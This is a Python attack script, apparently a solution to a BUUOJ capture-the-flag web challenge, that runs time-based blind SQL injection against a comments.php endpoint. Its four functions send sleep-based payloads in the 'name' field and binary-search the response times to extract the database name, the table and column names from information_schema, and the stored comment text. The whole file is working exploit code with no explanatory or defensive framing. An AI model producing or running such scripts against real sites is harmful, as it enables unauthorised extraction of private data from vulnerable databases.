import requests
import time

url='http://b8e981d3-04db-4a4e-b694-5f341cef6dbb.node4.buuoj.cn:81/comments.php'


def database():
    res = ''
    for i in range(1, 100):
        left = 32
        right = 128
        mid = (left + right) // 2
        while (left < right):
            payload = {
                'name':'3123||if(ascii(substr(database(),%d,1))<%d,sleep(0.3),0)'%(i,mid)
            }

            times=time.time()
            t = requests.post(url,data=payload)
            timee=time.time()
            keep=timee-times
            time.sleep(0.2)
            if keep>3:
                right = mid
            else:
                left = mid + 1
            mid = (left + right) // 2

        if mid <= 32 or mid >= 127:
            break
        res += chr(mid - 1)
        print(res)
    return res



def tables():
    res = ''
    for i in range(1, 100):
        left = 32
        right = 128
        mid = (left + right) // 2
        while (left < right):
            payload = {
                'name': '3123||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))<%d,sleep(0.3),0)' % (i, mid)
            }
            #print(payload)
            times = time.time()
            t = requests.post(url, data=payload)
            timee = time.time()
            keep = timee - times
            time.sleep(0.2)
            if keep > 3:
                right = mid
            else:
                left = mid + 1
            mid = (left + right) // 2

        if mid <= 32 or mid >= 127:
            break
        res += chr(mid - 1)
        print(res)
    return res
def columns():
    res = ''
    for i in range(1, 100):
        left = 32
        right = 128
        mid = (left + right) // 2
        while (left < right):
            payload = {
                'name': '3123||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name="wfy_information")),%d,1))<%d,sleep(0.1),0)' % (i, mid)
            }
            #print(payload)
            times = time.time()
            t = requests.post(url, data=payload)
            timee = time.time()
            keep = timee - times
            time.sleep(0.2)
            if keep > 1:
                right = mid
            else:
                left = mid + 1
            mid = (left + right) // 2

        if mid <= 32 or mid >= 127:
            break
        res += chr(mid - 1)
        print(res)
    return res
def values():
    res = ''
    for i in range(1, 100):
        left = 32
        right = 128
        mid = (left + right) // 2
        while (left < right):
            payload = {
                'name': '3123||if(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))<%d,sleep(0.2),0)' % (i, mid)
            }
            #print(payload)
            times = time.time()
            t = requests.post(url, data=payload)
            timee = time.time()
            keep = timee - times
            time.sleep(0.2)
            if keep > 2:
                right = mid
            else:
                left = mid + 1
            mid = (left + right) // 2

        if mid <= 32 or mid >= 127:
            break
        res += chr(mid - 1)

        print(res)
    return res

#a=database()
#a=tables()
a=columns()
#a=values()
print("逆序为："+a[::-1])